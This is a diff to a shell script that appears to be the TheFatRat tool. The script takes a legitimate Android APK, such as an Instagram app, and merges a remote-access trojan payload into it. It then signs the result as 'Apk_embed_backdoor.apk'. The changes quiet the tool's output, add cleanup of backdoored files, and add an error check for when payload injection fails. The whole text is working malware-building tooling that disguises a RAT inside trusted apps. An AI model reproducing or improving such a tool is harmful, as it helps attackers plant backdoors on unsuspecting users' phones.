@@ -112,7 +112,7 @@ cat << !
 #  Some Variables
 #####################
 path=`pwd`
-Versi=1.8.1
+Versi=1.8
 codename=Sparta
 OS=`uname` #
 distro=`awk '{print $1}' /etc/issue`
@@ -930,6 +930,7 @@ echo -e $okegreen"[ ]$okegreen==================================================
 echo ""
 echo "Cleaning Temp files"
 rm -rf output/*
+rm -rf backdoored/output/*
 sleep 2
 echo "Done!"
 echo -e $okegreen""
@@ -942,7 +943,7 @@ read yourport
 echo ""
 echo -ne $okegreen "Located Original Apk file for embed (example:$path/PE/instagram.apk) :" ;tput sgr0
 read copyfile
-cp $copyfile $path/output/fatrat.apk 
+cp $copyfile $path/output/fatrat.apk >/dev/null 2>&1
 apkt="$path/output/fatrat.apk"
 
 if [ ! -f $apkt ]; then
@@ -976,19 +977,26 @@ echo "Starting the merging process of RAT with the APK you selected"
 echo ""
 ruby $apkembed $path/output/fatrat.apk 
 echo ""
-echo "Merge completed of Payload with your APK"
 sleep 2
-cp $path/output/fatrat_backdoored.apk $path/backdoored/apkembed.apk
+cp $path/output/fatrat_backdoored.apk $path/backdoored/apkembed.apk >/dev/null 2>&1
+varopt="$path/backdoored/apkembed.apk"
+if [ ! -f $varopt ]; then
+    echo "[!] There was an error in the creation of your RAT APK file , the possible reasons are :
+- The original APK is protected
+- It was not possible to inject the payload in the hook you selected "
+    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
+menu
+fi
 echo "File copied with success to : $path/backdoored"
 sleep 2
 echo "Removing temporary files from output"
 sleep 2
-rm -rf $path/output/* 
+rm -rf $path/output/* >/dev/null 2>&1
 echo "Signing your APK file"
 sleep 2
 java -jar $bundle $cert $key $path/backdoored/apkembed.apk Apk_embed_backdoor.apk
-rm $path/backdoored/apkembed.apk
-mv $path/Apk_embed_backdoor.apk $path/backdoored/output/
+rm $path/backdoored/apkembed.apk >/dev/null 2>&1
+mv $path/Apk_embed_backdoor.apk $path/backdoored/output/ >/dev/null 2>&1
 outapk="$path/backdoored/output/Apk_embed_backdoor.apk"
 if [ ! -f $outapk ]; then
     echo "[!] APK Rat file was not found in : $path/backdoored/output/"
